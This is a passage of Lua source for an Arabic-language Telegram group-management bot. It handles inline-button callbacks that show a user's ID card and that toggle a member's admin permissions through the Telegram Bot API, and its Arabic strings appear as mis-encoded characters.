{text = 'English', callback_data=data.sender_user_id_.."/ideeng1@"..Id},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearp1@"..Id},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
return false
end
end

if Text and Text:match('(.*)/ideeng') then
if tonumber(Text:match('(.*)/ideeng')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*βΉ | Id π¦Ή '..Id..'\nβΉ | UsErNaMe π¦Ή * ['..UserName_User..']*\nβΉ | StAsT π¦Ή '..Status_Gps..'\nβΉ | MsGs π¦Ή'..NumMsg..' \nβΉ | Activity π¦Ή '..TotalMsg..'\nβΉ | GaMeS π¦Ή '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end
if Text and Text:match('(.*)/idearp') then
if tonumber(Text:match('(.*)/idearp')) == tonumber(data.sender_user_id_) then
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = data.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(arg,date) 
tdcli_function ({ID = "GetChatMember",chat_id_ = data.chat_id_,user_id_ = data.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end
if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if date.username_ then
UserName_User = '@'..date.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end

local Id = data.sender_user_id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..data.chat_id_..':'..data.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..data.chat_id_..Id) or Get_Rank(Id,data.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..data.chat_id_..data.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..data.chat_id_..data.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..data.chat_id_..":"..data.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
"Ψ§ΩΩΨ§ Ψ¨ΩΨ³ΩΩ ΨΉΩΩΩ ΩΨ¨Ψ΄Ω",
"Ψ§Ψ­ΩΨ§ ΩΨ³Ψ§ ΨΉΩΩΩ ΩΨ§Ψ¨Ψ§",
"ΩΨ΄ ΩΩΩΩΩ ΨΉΩΩΩ",
"Ψ΅ΩΨ±Ω ΩΩΩΨ¨Ω ΩΨ―",
}
local Description = Texting[math.random(#Texting)]
local texte = '\n*βΉ |Ψ§ΩΨ―ΩΩ  . '..Id..'\nβΉ | ΩΨΉΨ±ΩΩ  .* ['..UserName_User..']*\nβΉ |Ψ±ΨͺΨ¨ΨͺΩ  . '..Status_Gps..'\nβΉ | Ψ±Ψ³Ψ§Ψ¦ΩΩ  . '..NumMsg..' \nβΉ | Ψ§ΩΨͺΩΨ§ΨΉΩ . '..TotalMsg..'\nβΉ |Ψ§ΩΨ§ΩΨΉΨ§Ψ¨  . '..Num_Games..'*'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'English', callback_data=data.sender_user_id_.."/ideeng"},{text = 'ΨΉΨ±Ψ¨Ω', callback_data=data.sender_user_id_.."/idearp"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(texte)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end,nil)   
end,nil)   
end,nil)   
end
end



if Text and Text:match('amr@(%d+)/user@(%d+)/setiinginfo') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/setiinginfo$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=True'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/voicefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/voicefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = '&can_manage_voice_chats=false'..manage..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managetrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managetrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=True'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/managefalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/managefalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..'&can_manage_chat=false'..infoo..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addadmintrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadmintrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=true' 
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfotrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfotrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage..'&can_change_info=True' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=True' ..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banusertrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banusertrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..'&can_restrict_members=True' ..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/pinmsgtrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/pinmsgtrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..'&can_pin_messages=True' ..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/addlinktrue') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addlinktrue$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..deletee..'&can_invite_users=True' ..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end


if Text and Text:match('amr@(%d+)/user@(%d+)/addadminfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/addadminfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
if manage then
local ListGruoup = voice..manage.. infoo..deletee..invitee..restrictt..pinn..'&can_promote_members=false'
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
end
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/chenginfofalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/chenginfofalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. '&can_change_info=false' ..deletee..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/delmsggfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/delmsggfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
promotee = '&can_promote_members=false' 
end 
if Json_Info.can_manage_voice_chats == true then
voice = '&can_manage_voice_chats=True' 
else 
voice = '&can_manage_voice_chats=false' 
end
if Json_Info.can_manage_chat == true then
manage = '&can_manage_chat=True' 
else 
manage = '&can_manage_chat=false' 
end
local ListGruoup = voice..manage.. infoo..'&can_delete_messages=false'..invitee..restrictt..pinn..promotee
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id="..data.chat_id_ .."&user_id="..users[2]..ListGruoup)
sendin(Chat_id,msg_idd,data.sender_user_id_,users[2])
end
end
if Text and Text:match('amr@(%d+)/user@(%d+)/banuserfalse') then
local users = {string.match(Text,"^amr@(%d+)/user@(%d+)/banuserfalse$")}
if tonumber(users[1]) == tonumber(data.sender_user_id_) then
local Chek_Info = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='.. data.chat_id_ ..'&user_id='.. users[2])
local Json_Info = JSON.decode(Chek_Info)
if Json_Info.result.can_change_info == true then
infoo = '&can_change_info=True' 
else 
infoo = '&can_change_info=false' 
end
if Json_Info.result.can_delete_messages == true then
deletee = '&can_delete_messages=True' 
else 
deletee = '&can_delete_messages=false' 
end
if Json_Info.result.can_invite_users == true then
invitee = '&can_invite_users=True' 
else 
invitee = '&can_invite_users=false' 
end
if Json_Info.result.can_pin_messages == true then
pinn = '&can_pin_messages=True' 
else 
pinn = '&can_pin_messages=false' 
end
if Json_Info.result.can_restrict_members == true then
restrictt = '&can_restrict_members=True' 
else 
restrictt = '&can_restrict_members=false' 
end
if Json_Info.result.can_promote_members == true then
promotee = '&can_promote_members=true' 
else 
